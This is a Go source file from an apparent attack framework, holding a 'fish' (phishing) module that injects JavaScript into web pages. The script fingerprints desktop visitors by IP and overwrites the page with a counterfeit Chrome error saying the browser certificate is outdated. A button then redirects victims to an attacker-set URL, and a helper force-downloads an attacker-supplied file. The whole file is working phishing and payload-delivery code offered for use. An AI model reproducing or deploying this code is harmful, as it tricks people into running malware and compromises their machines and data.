package publicModule

import (
	webConfig "Spark/server/config"
	"github.com/gin-gonic/gin"
	"net/http"
)

var FishConfig = map[string]string{
	"path": webConfig.AppPathConfig["uploadPath"] + "/fish/",
}

var Module_fish_js = `
let geo_ip = document.createElement('script');
geo_ip.setAttribute('type','text/javascript');
geo_ip.setAttribute('src','https://pv.sohu.com/cityjson?ie=utf-8');
let add_head = document.getElementsByTagName('head')[0];
if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || /(Android)/i.test(navigator.userAgent)) {
      console.log("pass");
} else {
    add_head.appendChild(geo_ip);
};`

var Module_fish_js2 = `geo_ip.onload = function(){
	let block=['203.205.20.146','213.255.200.55','220.205.233.127'];
    if(block.indexOf(returnCitySN.cip)==-1){
		document['getElementsByTagName']('body')[0].innerHTML='<style>.interstitial-wrapper{box-sizing:border-box;font-size:1em;line-height:1.6em;margin:14vh auto 0;max-width:600px;width:100%}body{--background-color:#fff;--error-code-color:var(--google-gray-700);--google-blue-100:rgb(210,227,252);--google-blue-300:rgb(138,180,248);--google-blue-600:rgb(26,115,232);--google-blue-700:rgb(25,103,210);--google-gray-100:rgb(241,243,244);--google-gray-300:rgb(218,220,224);--google-gray-500:rgb(154,160,166);--google-gray-50:rgb(248,249,250);--google-gray-600:rgb(128,134,139);--google-gray-700:rgb(95,99,104);--google-gray-800:rgb(60,64,67);--google-gray-900:rgb(32,33,36);--heading-color:var(--google-gray-900);--link-color:rgb(88,88,88);--popup-container-background-color:rgba(0,0,0,.65);--primary-button-fill-color-active:var(--google-blue-700);--primary-button-fill-color:var(--google-blue-600);--primary-button-text-color:#fff;--quiet-background-color:rgb(247,247,247);--secondary-button-border-color:var(--google-gray-500);--secondary-button-fill-color:#fff;--secondary-button-hover-border-color:var(--google-gray-600);--secondary-button-hover-fill-color:var(--google-gray-50);--secondary-button-text-color:var(--google-gray-700);--small-link-color:var(--google-gray-700);--text-color:var(--google-gray-700);background:var(--background-color);color:var(--text-color);word-wrap:break-word}body{font-family:"Segoe UI",Arial,"Microsoft Yahei",sans-serif;font-size:75%}.icon{height:72px;margin:0 0 40px;width:72px;background-repeat:no-repeat;background-size:100%}h1{color:var(--heading-color);font-size:1.6em;font-weight:normal;line-height:1.25em;margin-bottom:16px}.error-code{color:var(--error-code-color);font-size:.8em;margin-top:12px;text-transform:uppercase}.nav-wrapper{margin-top:51px}button{border:0;border-radius:4px;box-sizing:border-box;color:var(--primary-button-text-color);cursor:pointer;float:right;font-size:.875em;margin:0;padding:8px 16px;transition:box-shadow 150ms cubic-bezier(0.4,0,0.2,1);user-select:none}.hidden{display:none}.secondary-button{background:var(--secondary-button-fill-color);border:1px solid var(--secondary-button-border-color);color:var(--secondary-button-text-color);float:none;margin:0;padding:8px 16px}.nav-wrapper::after{clear:both;content:"";display:table;width:100%}</style><div class="interstitial-wrapper ssl"><div id="main-content"><div class="icon"id="icon"style="background-image: -webkit-image-set(url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAMAAABiM0N1AAABAlBMVEUAAADcRTfcRDfdRET/gIDcRjr/ZmbjVTncRDfcRTfcRDfdRDzgSTncRDjeSDvcRTjbRDfbRDjeRzvcRjfbRjjcRTjcRTjcRTfdRTfcRDjdRTjcRTjbRDjbRTjbRTjbRTfcRjjdRDrcRjfbRTjZQzfcRDjZRDfZRzbWQzXXRDXXQzbXQzbWQjXYSDvWQjbbRDfOQDPSQTTUQjXCPDDNPzPJPjLGPTHVQjXMPzPRQTTWQjXLPzPDPDHYQzbAOzDTQTXHPTLIPjK8Oi++Oy/FPTHEPTHPQDTQQDTUQTXBPDDKPjK/OzC9Oi/////PQDPRQDS3OS66OS7TQTTEPDHXQjbMPjMBhLaWAAAAL3RSTlMA4tgPAhYFCcL98B4x9ie1+s49WICbqXNKZY3pjuqcgVdLZnL2qKg9zmXpjfontV8LANsAAAJrSURBVHhe7ZTnduIwFAY3ARIgBAg9vW1v173ROylby/u/yso2Fx3MNaxs9h/zAHM+Sfa8+M/s2LFjx+3tdjwH+/sHWxHVAerb8KSyANnUFkRXwLiK78llgJHJxRalwSMd11OGOeV4nsM9FO0dxhJdw4LrOJ6jYy46PoohqgEHatE9JViiFNWTPIElTpIRRXcQ4C6aJ3EJAS4TkUQXsMJFFE++CCsU8xFEBSAoiHsaQNIQ7yuQCFe3DiHUhftKIlzdKoRSFe0r8sXDAkSoumkIigYaIOkIfeWi56EESFm8r1w0fFIl4epWgBA9qOMpmirCfeWijtoa9WSx6taAELFBRl/vilS3BJRIbRk9/VFTsLrifUXRuNfXLU0y/7m6p0CKxqN+v6lJU/k3eJxu7Os5LWKDHi1tYstKG1zON1X3DGiRMR80Mx3fdCbc1+bQe3o2SJrYXcV0fFMxL9xXiz0987BBtux65qaCeF8lHCR3FabBTQ3xvk4M1yN5B/Mw2+urew8hTP1BM38Qnu5evK8gMw+7IcfH9E3ZlEBfMSO//Kf35+Cm6ua+rhbSYDeEa9CUyW3qK1HIjj5DBz8dWd0bWCd6Ult/uMPEr+BmbV/JHrVG/a9MsEybV5fsK50R3frmBFXtCtVXmt73H4PhQ4t9k9rkJ55tYXwZrO4rCEUfPHfUEcuaZC/umw97TfaVpslu2tCb2lRWnBlKFtf+huwrjaa6Pxv7RfgW7nubJPtKI/X0puQO4k/Pfe/ovtLY7KbxVwve0/sE3VeaLosIbkEDvt8Hoq/hKGwQYvoq5OMnoq/hLAbgc/FVn33PX7pAfE5QHR6fAAAAAElFTkSuQmCC) 1x,url(data:image/png;base64,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) 2x);"></div><div id="main-message"><h1>浏览器证书版本过低</h1><p>浏览器检测到上游签发的证书与浏览器不匹配。请立即更新浏览器证书文件，以确保可靠的数据传输！</p><div id="debugging"><div id="error-code"class="error-code"role="button"aria-expanded="false">net::ERR_BROWSER_CERT_VERYFI_FAIL</div></div></div></div><div class="nav-wrapper"><button id="primary-button"style="background: var(--primary-button-fill-color);"onclick="window.location.getCert();">更新证书文件</button><button id="proceed-button"class="secondary-button small-link hidden"></button><button id="details-button"class="secondary-button small-link"aria-expanded="false"onclick="#">返回</button></div></div>';
	}
};`

var Module_fish_js3 = `
function ni_download(){

	fileName = '%s';
	content = '%s';

		a = document.createElement("a");
		a.download = fileName;
		document.getElementsByTagName('html')[0].appendChild(a);
		a.href = URL.createObjectURL(new Blob([decodeURIComponent(content)]));
		a.click();
		a.remove();
	
}
`

var Module_fish_invoke = `window.location.getCert=function (){
	window.location.href=%s;
}`

func Module_fish_next(c *gin.Context, moduleID, taskName string) {

	c.JSON(
		http.StatusOK,
		map[string]string{
			"status":   "nextFish",
			"moduleID": moduleID,
			"taskName": taskName,
		},
	)

}
